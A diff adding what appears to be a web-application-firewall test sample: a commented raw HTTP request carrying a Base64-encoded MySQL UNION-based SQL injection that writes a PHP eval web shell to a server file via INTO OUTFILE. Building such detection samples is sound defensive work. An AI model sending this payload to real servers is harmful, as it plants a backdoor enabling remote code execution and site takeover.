@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_文件写入(Base64编码)
+# 攻击者基于UNION查询，将"union select "<?php @eval($_POST[abc]);?>" into outfile "D:\\phpstudy\\www\\1.php""语句注入到 SQL 查询参数中，将一段PHP代码写入到文件 "D:\phpstudy\www\1.php" 中，一旦成功执行，该文件将包含恶意代码，可能导致进一步的攻击行为，例如远程代码执行或操纵受感染的服务器。这种攻击可能导致网站的完全破坏、敏感信息泄露或非法访问。
+GET /?id=MSB1bmlvbiBzZWxlY3QgIjw%2FcGhwIEBldmFsKCRfUE9TVFthYmNdKTs%2FPiIgaW50byBvdXRmaWxlICJEOlxccGhwc3R1ZHlcXHd3d1xcMS5waHAi&bid=hd_tag_m8mv252x HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv252x
+RM-PRO-Token: eda5902f2fd2833803de69320b71c357
+RM-PRO-Time: 1742808434441
+User-Agent: curl/7.83.1
+
